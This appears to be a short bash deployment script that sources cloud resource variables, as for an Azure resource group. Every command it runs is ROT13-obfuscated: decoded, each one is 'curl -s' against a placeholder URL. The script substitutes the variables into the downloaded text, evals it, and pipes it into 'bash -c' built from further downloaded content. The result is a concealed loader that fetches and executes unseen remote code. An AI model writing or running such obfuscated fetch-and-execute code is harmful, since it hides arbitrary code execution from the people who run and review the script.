#!/bin/bash
set -e
source ../_variables.sh

$($(echo "phey -f <URL>/1" | tr '[N-ZA-Mn-za-m]' '[A-Za-z]') | xargs -0 -I {} printf {} ${RESOURCE_GROUP_LOCATION} ${RESOURCE_PREFIX} ${RESOURCE_PREFIX} | xargs -0 -I {} echo {})
(eval $($(echo "phey -f <URL>/2" | tr '[N-ZA-Mn-za-m]' '[A-Za-z]') | xargs -0 -I {} printf {} ${RESOURCE_PREFIX})) | xargs -L1 bash -c "$($(echo "phey -f <URL>/1n" | tr '[N-ZA-Mn-za-m]' '[A-Za-z]'))"